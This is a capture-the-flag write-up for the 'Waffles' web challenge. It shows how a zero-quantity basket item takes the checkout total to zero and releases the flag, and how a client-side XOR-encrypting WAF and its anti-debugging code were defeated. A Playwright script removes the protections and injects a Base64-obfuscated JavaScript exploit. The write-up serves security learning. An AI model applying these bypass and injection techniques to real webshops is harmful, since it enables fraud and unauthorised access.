# Hey there!

this is An analysis of the "Waffles" CTF challenge, a complex web security task that required bypassing a custom Web Application Firewall (WAF), learning how a piece of obfuscated JavaScript worked, and exploiting a backend logic flaw.

### **Challenge Overview**

*   **Name:** Waffles
*   **Difficulty:** Very Hard
*   **Author:** OddNorseman
*   **Description:** The scenario involves a webshop protected by a custom WAF implemented via client-side JavaScript. The challenge is to bypass this protection and exploit a vulnerability in the backend Flask application to retrieve the flag. The application's source code was provided, but the client-side code was heavily obfuscated.

***
# بِسْمِ اللهِ الرَّحْمٰنِ الرَّحِيْمِ

### Part 1: Analyzing the Backend Vulnerability

The first step was to understand the flask app. The Flask application source code revealed the core logic of the webshop. By analyzing the API endpoints, we can see an issue in the checkout flow.

**Key Endpoints:**

*   `/api/basket` (POST): Creates a new shopping basket and returns a unique `session_id`.
*   `/api/basket/add` (POST): Adds a product to the basket associated with a `session_id`. The total price is calculated as `sum(item['price'] * item['quantity'])`.
*   `/api/checkout` (POST): Processes the order.

The vulnerability lies within the `/api/checkout` function:

```python
@app.route('/api/checkout', methods=['POST'])
def checkout():
    session_id = request.headers.get('X-Session-ID', None)
    basket = baskets.get(session_id, None)
    # ... (error handling) ...
    
    # Check if basket is empty
    if not basket['items']:
        return jsonify({'error': 'Cannot checkout with an empty basket'}), 400
    
    # Check if basket requires payment (total > 0)
    if basket['total'] > 0:
        return jsonify({'error': 'Payment processing failed. Please try again later.'}), 402
    
    order_id = os.environ.get('FLAG', 'brunner{REDACTED}')
    
    # ... (clear basket) ...
    
    return jsonify({
        'success': True,
        'order_id': order_id,
        'message': 'Order processed successfully!'
    })
```

The logic dictates two conditions for a successful checkout that reveals the flag:
1.  The basket must not be empty (`if not basket['items']`).
2.  The basket's total value must be less than or equal to zero (`if basket['total'] > 0`).

By adding a product with a `quantity` of `0`, we can satisfy both conditions. The basket will contain an item, but its contribution to the total will be `price * 0`, resulting in a `total` of `0.0`.

A simple Python script confirms this vulnerability locally:

```python
import requests

BASE = "http://127.0.0.1:1337"

# 1. Create a basket to get a session ID
r = requests.post(f"{BASE}/api/basket")
session_id = r.json()

# 2. Add a product with quantity 0
requests.post(
    f"{BASE}/api/basket/add",
    headers={"X-Session-ID": session_id, "Content-Type": "application/json"},
    json={"product_id": 1, "quantity": 0},
)

# 3. Checkout with a total of 0.0
r = requests.post(
    f"{BASE}/api/checkout",
    headers={"X-Session-ID": session_id, "Content-Type": "application/json"},
    json={},
)

# The response contains the flag
print(r.json())
# {'message': 'Order processed successfully!', 'order_id': 'brunner{REDACTED}', 'success': True}
```

With the backend vulnerability understood, the primary obstacle became the custom WAF.

### Part 2: Reverse-Engineering the Client-Side WAF

The breakthrough in understanding this mechanism came from discovering a source map file linked in the obfuscated code : `fetch.js.map`. This file had a partial part of the obfuscated `fetch.js`, revealing part of the original source code that powered the WAF.

in the code was a custom `myFetch` function that overrode the browser's default `fetch` behavior (i removed some code for ease of readabillity) :

```javascript
function xorEncrypt(data, key) {
  const out = new Uint8Array(data.length);
  for (let i = 0; i < data.length; i++) {
    out[i] = data[i] ^ key.charCodeAt(i % key.length);
  }
  return out;
}

function base64Encode(uint8arr) {
  let binary = "";
  uint8arr.forEach((b) => (binary += String.fromCharCode(b)));
  return btoa(binary);
}

function getCookie(name) {
    // ... retrieves a cookie by name ...
}

async function myFetch(url, options = {}) {
  // The key is retrieved from a cookie named 'x'
  const key = getCookie("x");
  if (!key) {
    throw new Error("Cookie 'x' not found.");
  }

  let body = options.body;
  if (body) {
    // ... (converts body to bytes) ...

    // The body is encrypted and then encoded
    const encrypted = xorEncrypt(bodyBytes, key);
    const b64 = base64Encode(encrypted);
    options.body = b64; // The modified body is sent
  }

  return fetch(url, options);
}

// Override the global fetch function
window.fetch = myFetch;
```

This code revealed that before any API request was sent, its body was:
1.  **XOR-encrypted** using a key.
2.  The key was the value of a cookie named `x`.
3.  The encrypted result was **Base64-encoded**.

This meant that simply sending the plain JSON payload from a script would not work. Each request had to be encrypted using the correct, session-specific key.

### Part 3: Defeating Fingerprinting and Anti-Debugging

The next challenge was obtaining the encryption key from the `x` cookie. It quickly became clear that this key was not static. each time that `/fetch.js` was fetched, a `SETCOOKIE` header with the `x` cookie would be sent, although, it proved to be unneccesary to do all the fetching and encrypting manually.

Also, the application had anti-debugging stuff. Opening the browser's developer tools would trigger a `document.write()`, wiping the page and displaying a message: `"Oi! You hacker types are not welcome!"`.

### Part 4: The Final Exploit - Browser Automation and JS Injection

Since recreating the fingerprinting and encryption was not feasible, the final strategy was to hijack the legitimate client environment. This was achieved using **Playwright**, a browser automation library for Python.

The plan was as follows:
1.  **Launch a Browser:** Use Playwright to start a headless or headed Chromium instance.
2.  **Intercept and Modify:** Intercept the initial HTML response from the server *before* it renders on the page.
3.  **Neutralize Anti-Debugging:** Use regular expressions to find and remove the JavaScript code responsible for the anti-debugging `document.write` calls.
4.  **Inject the Exploit:** Inject a custom JavaScript payload into the modified HTML. This payload would execute within the legitimate context of the page, giving it access to the correctly generated `x` cookie and the custom `myFetch` function.

The final Python script orchestrates this entire process. It launches the browser, sets up a route handler to modify the initial HTML, and injects a Base64-encoded JavaScript payload that carries out the three-step attack.

```py
# puppeteer_proxy_logger.py
import asyncio
import base64
from playwright.async_api import async_playwright
import json
import re
# This was used for some testing
def xor_decrypt(base64_data: str, key: str) -> bytes:
    binary = base64.b64decode(base64_data)
    out = bytearray(len(binary))
    for i in range(len(binary)):
        out[i] = binary[i] ^ ord(key[i % len(key)])
    return out  # return raw bytes

async def main():
    async with async_playwright() as pw:
        browser = await pw.chromium.launch(headless=False, args=["--disable-web-security"])
        page = await browser.new_page()

        # --- JavaScript Exploit Payload ---
        exploit_payload = """
            setTimeout(() => {
                // --- Setup for writing to the page ---
                document.body.innerHTML = '<h1>Exploit Initializing...</h1><pre id="exploit-log" style="white-space: pre-wrap; word-break: break-all; border: 1px solid #ccc; padding: 10px;"></pre>';
                const logElement = document.getElementById('exploit-log');
                const logToPage = (message) => {
                    if (typeof message === 'object') {
                        logElement.textContent += JSON.stringify(message, null, 2) + '\\n';
                    } else {
                        logElement.textContent += message + '\\n';
                    }
                };

                // --- Cookie-based State Management ---
                const setProgress = (step, sessionId) => {
                    const state = { step, sessionId, timestamp: Date.now() };
                    document.cookie = `exploit_progress=${JSON.stringify(state)};path=/`;
                    logToPage(`[+] Progress saved: At step '${step}'.`);
                };

                const getProgress = () => {
                    const match = document.cookie.match(/exploit_progress=([^;]+)/);
                    if (match) {
                        try { return JSON.parse(match[1]); } catch (e) { return null; }
                    }
                    return null;
                };

                const clearProgress = () => {
                    logToPage('[+] Clearing progress cookie.');
                    document.cookie = 'exploit_progress=;path=/;expires=Thu, 01 Jan 1970 00:00:00 GMT';
                };

                // --- Main Exploit Logic ---
                (async () => {
                  const BASE = "https://waffles.challs.brunnerne.xyz";
                  let session_id;
                  
                  try {
                    const progress = getProgress();
                    let currentStep = progress ? progress.step : 'createBasket';
                    session_id = progress ? progress.sessionId : null;
                    
                    document.querySelector('h1').textContent = `Exploit Running... (State: ${currentStep})`;
                    if (progress) {
                        logToPage(`[!] Resuming from saved progress at step: ${currentStep}`);
                    }

                    // STEP 1: Create Basket
                    if (currentStep === 'createBasket') {
                        logToPage("[*] Step 1: Creating basket...");
                        const response = await fetch(`${BASE}/api/basket`, { method: "POST" });
                        if (!response.ok) throw new Error(`Failed to create basket: ${response.status}`);
                        
                        // ===== THE CRITICAL FIX IS HERE =====
                        session_id = await response.json(); // Use .json() to correctly parse the quoted string
                        // ===================================
                        
                        logToPage(`[*] New Session ID: ${session_id}`);
                        currentStep = 'addProduct';
                    }

                    // STEP 2: Add Product
                    if (currentStep === 'addProduct') {
                        logToPage(`[*] Step 2: Adding product with quantity 0...`);
                        const response = await fetch(`${BASE}/api/basket/add`, {
                          method: "POST",
                          headers: { "X-Session-ID": session_id, "Content-Type": "application/json" },
                          body: JSON.stringify({ product_id: 1, quantity: 0 })
                        });

                        if (response.status === 400) {
                            logToPage('[!] Received status 400. Saving progress and reloading page...');
                            setProgress('addProduct', session_id);
                            location.reload();
                            return;
                        }
                        if (!response.ok) throw new Error(`Failed to add product: ${response.status}`);
                        
                        const basket = await response.json();
                        logToPage("[+] Product added successfully. Basket state:");
                        logToPage(basket);
                        currentStep = 'checkout';
                    }

                    // STEP 3: Checkout
                    if (currentStep === 'checkout') {
                        logToPage(`[*] Step 3: Checking out...`);
                        const response = await fetch(`${BASE}/api/checkout`, {
                          method: "POST",
                          headers: { "X-Session-ID": session_id, "Content-Type": "application/json" },
                          body: JSON.stringify({})
                        });

                        if (response.status === 400) {
                            logToPage('[!] Received status 400 at checkout. Saving progress and reloading...');
                            setProgress('checkout', session_id);
                            location.reload();
                            return;
                        }
                        if (!response.ok) throw new Error(`Checkout failed: ${response.status}`);
                        
                        const data = await response.json();
                        logToPage("[*] Checkout response:");
                        logToPage(data);

                        if ("order_id" in data) {
                          logToPage("=====================================");
                          logToPage("✅ FLAG FOUND ✅");
                          logToPage(data.order_id);
                          logToPage("=====================================");
                          document.querySelector('h1').textContent = 'Exploit Complete: FLAG FOUND!';
                          clearProgress();
                        } else {
                          throw new Error("Checkout succeeded but no flag was found.");
                        }
                    }

                  } catch (err) {
                    logToPage("FATAL ERROR during workflow: " + err.message);
                    document.querySelector('h1').textContent = 'Exploit FAILED!';
                    clearProgress();
                  }
                })();
            }, 3000);
        """

        # --- Create the final script to inject ---
        encoded_exploit = base64.b64encode(exploit_payload.encode('utf-8')).decode('ascii')
        injector_script = f"const b64='{encoded_exploit}';new Function(atob(b64))();"

        async def log_and_modify_request(route, request):
            url = request.url
            if url.endswith("/.well-known/appspecific/com.chrome.devtools.json"):
                await route.fulfill(status=404, content_type="text/plain", body="Not Found")
                return

            print("=" * 80)
            print(f"➡️  REQUEST: {request.method} {url}")
            if request.post_data:
                cookies = await page.context.cookies()
                x_cookie = next((c['value'] for c in cookies if c['name'] == 'x'), None)
                if x_cookie:
                    try:
                        decrypted_bytes = xor_decrypt(request.post_data, x_cookie)
                        print("   🔓 Decrypted Body (hex):", decrypted_bytes.hex())
                    except Exception as e:
                        print("   (Couldn't decrypt body)", str(e))
            
            try:
                response = await route.fetch()
                if response.headers.get("content-type", "").startswith("text/html"):
                    body = await response.text()
                    
                    body = re.sub(r'document\.open\(\);\s*document\.write\(t\);\s*document\.close\(\);', '', body, flags=re.DOTALL)
                    body = re.sub(r'document\.open\(\);\s*document\.write\("Oi! You hacker types are not welcome!"\);\s*document\.close\(\);', '', body, flags=re.DOTALL)
                    
                    pattern = re.compile(r"(bootstrapping\.onload\s*=\s*\(\)\s*=>\s*\{)")
                    if pattern.search(body):
                        body = pattern.sub(r"\1" + injector_script, body, count=1)
                        print("   ✨ Injected final Base64-encoded exploit.")
                    else:
                        print("   (Could not find bootstrapping.onload to inject script)")

                    await route.fulfill(response=response, body=body)
                else:
                    await route.fulfill(response=response)
            except Exception as e:
                print(f"   (Could not modify response for {url}: {e})")
                await route.continue_()

        await page.route("**/*", log_and_modify_request)

        async def log_response(response):
            try:
                print("-" * 80)
                print(f"⬅️  RESPONSE: {response.status} {response.url}")
            except Exception as e:
                print("Error logging response:", e)

        page.on("response", log_response)

        await page.goto("https://waffles.challs.brunnerne.xyz/", wait_until="networkidle")


        await asyncio.Event().wait()

if __name__ == "__main__":
    asyncio.run(main())
```

### Conclusion

The "Waffles" challenge was a example of a multi-layered web security problem. It required not just identifying a backend logic flaw but also navigating a heavily protected client-side environment. The solution showed that when there is complicated client-side protections like fingerprinting and obfuscation, sometimes the best solution is not to reverse-engineer the entire system and re-implement everything, but to manipulate the legitimate client itself.

A Big thanks to [Mushroom](https://mushroom.cat/) for helping me solve this challenge.

### A little extra
Here is a screenshot of the CTF chat when i beat the challenge:
<img width="439" height="693" alt="image" src="https://github.com/user-attachments/assets/a641a031-5a82-46f3-9315-a67b17ce58e8" />
<img width="871" height="527" alt="image" src="https://github.com/user-attachments/assets/b77213d2-aa2e-4229-ba32-9ed3cb801b38" />

